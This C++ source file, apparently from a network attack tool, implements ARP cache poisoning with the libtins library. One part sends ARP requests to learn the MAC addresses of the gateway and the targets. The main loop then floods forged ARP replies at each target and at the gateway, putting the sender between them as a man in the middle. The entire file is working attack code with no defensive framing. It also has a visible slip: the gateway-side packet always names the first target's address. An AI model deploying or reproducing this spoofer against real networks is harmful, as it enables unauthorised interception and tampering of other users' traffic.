#include"arpspoof.h"

#include<glog/logging.h>

#include"global.h"


Tins::EthernetII generateARPRequestPacket(const Tins::NetworkInterface &interface,const Tins::IPv4Address &target)
{
    Tins::EthernetII packet(Tins::EthernetII("ff:ff:ff:ff:ff:ff",interface.hw_address())/Tins::ARP(target,interface.ipv4_address(),"00:00:00:00:00:00",interface.hw_address()));
    packet.find_pdu<Tins::ARP>()->opcode(Tins::ARP::REQUEST);
    return packet;
}
Tins::EthernetII generateARPSpoofPacket(const Tins::NetworkInterface &interface,const Tins::IPv4Address &target,const Tins::HWAddress<6> &targetHW,const Tins::IPv4Address &address)
{
    Tins::EthernetII packet(Tins::EthernetII(targetHW,interface.hw_address())/Tins::ARP(target,address,targetHW,interface.hw_address()));
    packet.find_pdu<Tins::ARP>()->opcode(Tins::ARP::REPLY);
    return packet;
}
void sendARPRequestPacket()
{
    Tins::PacketSender sender;
    Tins::EthernetII *requestPacket=new Tins::EthernetII[targetNum+1];
    requestPacket[0]=generateARPRequestPacket(interface,gateway.address);
    for(int i=0;i<targetNum;i++)
        requestPacket[i+1]=generateARPRequestPacket(interface,target[i].host.address);
    while(!quit)
    {
        for(int i=0;i<=targetNum;i++)   //When i==0,it will send the request packet of gateway
            sender.send(requestPacket[i],interface);
        for(int i=0;i<50&&!quit;i++)
            usleep(100000);
    }
}
void receiveARPResponsePacket()
{
    Tins::SnifferConfiguration configuration;
    configuration.set_timeout(1);
    configuration.set_pcap_sniffing_method([](pcap_t *p,int cnt,pcap_handler callback,u_char *user)->int
    {
        int re=pcap_dispatch(p,cnt,callback,user);
        return re==0?-1:re;
    });
    configuration.set_filter("ether dst "+interface.hw_address().to_string()+" and arp dst host "+interface.ipv4_address().to_string()+" and arp[6:2]==2");
    Tins::Sniffer sniffer(interface.name(),configuration);
    pcap_setnonblock(sniffer.get_pcap_handle(),1,nullptr);
    while(!quit)
    {
        Tins::PDU *packet=sniffer.next_packet();
        if(packet==nullptr)
            continue;
        if(packet->find_pdu<Tins::ARP>()->sender_ip_addr()==gateway.address)
        {
            gateway.HWAddressMutex.lock();
            gateway.HWAddress=packet->find_pdu<Tins::ARP>()->sender_hw_addr();
            gateway.HWAddressMutex.unlock();
        }
        else
            if(ipToTarget.count(packet->find_pdu<Tins::ARP>()->sender_ip_addr().to_string())>0)
            {
                Target *target=ipToTarget.at(packet->find_pdu<Tins::ARP>()->sender_ip_addr().to_string());
                target->host.HWAddressMutex.lock();
                target->host.HWAddress=packet->find_pdu<Tins::ARP>()->sender_hw_addr();
                target->host.HWAddressMutex.unlock();
            }
        delete packet;
    }
}
void sendSpoofPacket()
{
    Tins::PacketSender sender;
    Tins::HWAddress<6> gatewayHWAddress;
    Tins::HWAddress<6> *targetHWAddress=new Tins::HWAddress<6>[targetNum];
    while(!quit)
    {
        for(int i=0;i<targetNum;i++)
        {
            Tins::EthernetII packet1,packet2;
            if(target[i].host.HWAddressMutex.try_lock_shared())
            {
                targetHWAddress[i]=target[i].host.HWAddress;
                target[i].host.HWAddressMutex.unlock_shared();
            }
            packet1=generateARPSpoofPacket(interface,target[i].host.address,targetHWAddress[i],gateway.address);
            if(gateway.HWAddressMutex.try_lock_shared())
            {
                gatewayHWAddress=gateway.HWAddress;
                gateway.HWAddressMutex.unlock_shared();
            }
            packet2=generateARPSpoofPacket(interface,gateway.address,gatewayHWAddress,target->host.address);
            sender.send(packet1,interface);
            sender.send(packet2,interface);
        }
    }
    delete[] targetHWAddress;
}